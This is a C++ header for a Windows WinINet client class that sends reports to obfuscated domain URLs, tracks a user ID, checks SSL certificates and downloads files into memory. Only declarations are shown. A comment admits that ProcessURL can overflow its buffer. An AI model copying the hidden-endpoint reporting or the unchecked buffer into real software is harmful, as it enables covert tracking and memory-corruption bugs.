/*

	The class cannot be safely called from within DllMain or the constructors and destructors of global objects.
	It's not thread-safe also.

*/
#pragma once


#include <locale>         // std::locale, std::tolower
#include <vector>
#include "wincrypt.h"
#include "CXRString.h"
#include "TinyAES.h"
#include "URLCipher.h"
#include "MD5.h"
#include "PrintLog.h"
#include <list>

// Turns on debug output for this module:
#define IC_DBG_PRINT

#pragma warning(disable : 4482)
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "psapi.lib")

#define INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT    105

#define IC_MAX_TRIES				3     // number of tries for all SendRequest* functions.
#define IC_TRIES_DELAY				100   // delay between tries, in ms.
#define IC_SSL_CERT_BUF_SIZE		1024  // SSL cert buffer size, in bytes.
#define IC_SEC_BUF_SIZE				1024  // SecureBuffer size: used in SecureSprintf function.

#define IC_TEMP_RESPONSE_BUF_SIZE		1 * 1024 // temporary response buffer size
#define IC_TEMP_DOWNLOAD_BUF_SIZE		4 * 1024 // temporary download buffer size
#define IC_PREALLOC_DOWNLOAD_BUF_SIZE	12 * 1024 * 1024 // preallocated buffer size, should be enough to store the biggest downloaded file.

/*
namespace std
{
#if defined(_UNICODE) || defined(UNICODE)
    wostream & tcout = wcout;
#else
    ostream & tcout = cout;
#endif
};
*/

class InetClient
{
public:
	InetClient(void);
	~InetClient(void);

	enum Scheme
	{
    HTTP = 0,
    HTTPS
	};
	enum RequestMethod
	{
    GET = 0,
    POST
	};
	
	std::string  GenerateGuid();
	const char  *getDomain();
	
	// ! ProcessURL is dangerous -- it assumes input buffer is of 1024 bytes, otherwise it can cause overflow:
	// Processes obfuscated URL, uses CreateReportUrl and CreateRawUrl helpers:
	void ProcessURL(char *url); // changes m_UID and m_quant
	void CreateReportUrl(char *url);
	void CreateRawUrl(char *url, const char *cxr, const char *param, bool withQuant);
	// Used in Create* functions:
	void SecureSprintf(DWORD *dst, DWORD *dwResultSize, const char *source, const char *str1, const char * str2, const char * str3, const  char * str4, const char * str5);
	
	// Most-used functions, make them static?
	std::string SendReport(int id);
	std::string SendReportWithParam(const char *szPath, const char *szParam);
	bool        Send2142SpecialFeedBack();
	bool        CheckSSLCertificate(int action);
	bool        CheckDomainConnection();
	bool        CheckDomainConnectionAndSSL(bool& SSLSuccess);
	
	CXRString cxrMainDomain;
	CXRString cxrReportUrlA;
	CXRString cxrReportUrlB;

	std::string m_action;
	std::string m_UID;
	std::string m_quant;
	std::string m_RND;
	bool        m_bUsePrevRND; // used in Send2142SpecialFeedBack to keep the same RND value between two reports.
	// --------------------------------------------------

	// Stores downloaded file:
	size_t				m_DownloadedFileSize;
	std::vector<byte>   m_DownloadedFile; 

	size_t	 GetDownloadedFileBufferSize();
	byte    *GetDownloadedFileBuffer();

	// Prepare is called internally before any download:
	void PrepareDownloadedFile();
	// Downloads file to internal memory structure:
	bool DownloadFile(const std::string &url);
	// Erase can be called optionally:
	void EraseDownloadedFile();

	// Wrapper functions for SendRequest, uses defined number of IC_MAX_TRIES:
	bool SendGetRequest(const std::string &url, std::string &response);
	// Uses stored SSL cert for request and then updates caller's strCertificate: 
	bool SendGetRequestWithSSLCert(const std::string &url, std::string &response, std::string &strCertificate);
	bool SendPostRequest(const std::string &url, const std::string &postData, std::string &response);

//private:
public:
	HINTERNET		m_hInternet;
    HINTERNET		m_hSession;
	DWORD			m_dwErr;
	std::string		m_sUserAgent;
	bool			m_bConnected;
	TCHAR			m_szSSLCert[IC_SSL_CERT_BUF_SIZE];

	bool			Connect(const std::string &host, int port, DWORD dwAccessType);
	bool			Disconnect();
	
	// Splits URL into scheme, host, port and query:
	bool			ParseURL(const std::string &url, InetClient::Scheme &scheme, std::string &host, int &port, std::string &query);
    
	unsigned int	GetDefaultPort(const Scheme &scheme);
	std::string		GetRequestMethod(const RequestMethod &requestMethod);

	// Sends GET or POST request and returns response:
	bool			SendRequest(const std::string &url, std::string &response, const RequestMethod requestMethod = RequestMethod::GET, const std::string &postData = _T(""), bool bGetSSLCert = false);

private:
	// Registry helper function to track proxy settings:
	DWORD GetRegistryDwordValue(HKEY hive, std::string subKey, std::string value);
	std::string GetRegistryStringValue(HKEY hive, std::string subKey, std::string value);
    
	// own copy of the function from RandomNumber.h
	void gen_random(char *s, const int len);

};

//
